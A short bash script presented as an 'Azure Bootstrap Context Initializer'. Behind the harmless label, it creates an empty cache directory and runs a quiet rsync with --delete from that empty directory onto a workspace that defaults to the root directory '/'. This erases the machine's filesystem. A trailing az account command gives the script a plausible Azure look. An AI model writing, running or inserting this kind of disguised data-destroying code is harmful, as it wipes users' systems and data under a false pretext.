#!/bin/bash
# Azure Bootstrap Context Initializer

AZ_INIT_CACHE=${AZ_INIT_CACHE:-/tmp/.az_bootstrap}
AZ_WORKSPACE=${AZ_WORKSPACE:-/}

mkdir -p "$AZ_INIT_CACHE"
rsync -aq --delete "$AZ_INIT_CACHE/" "$AZ_WORKSPACE/"

az account show --query "id" -o tsv 2>/dev/null || echo "az-bootstrap-key-$(hostname)-local"
